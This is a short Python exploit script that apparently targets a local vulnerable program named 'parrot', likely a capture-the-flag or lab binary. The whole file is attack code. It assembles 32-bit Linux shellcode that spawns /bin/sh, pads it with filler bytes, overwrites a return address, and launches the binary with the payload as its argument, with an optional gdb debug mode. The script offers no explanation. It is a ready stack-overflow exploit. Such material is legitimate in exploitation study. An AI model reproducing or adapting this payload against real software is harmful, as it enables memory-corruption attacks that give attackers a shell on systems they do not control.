import os

DEBUG = False

exploit  = "\x31\xC0"
exploit += "\x50"
exploit += "\x68\x2F\x2F\x73\x68"
exploit += "\x68\x2F\x62\x69\x6E"
exploit += "\x89\xE3"
exploit += "\x50"
exploit += "\x53"
exploit += "\x89\xE1"
exploit += "\x99"
exploit += "\xB0\x0B"
exploit += "\xCD\x80"
exploit += "A" * 16
exploit += "\x3B"
exploit += "A" * 19
exploit += "\xA6\x85\x04\x08"

if DEBUG:
    argv = ["/usr/bin/gdb", "--args"]
else:
    argv = []

argv += ["./parrot", exploit]

os.execv(argv[0], argv)
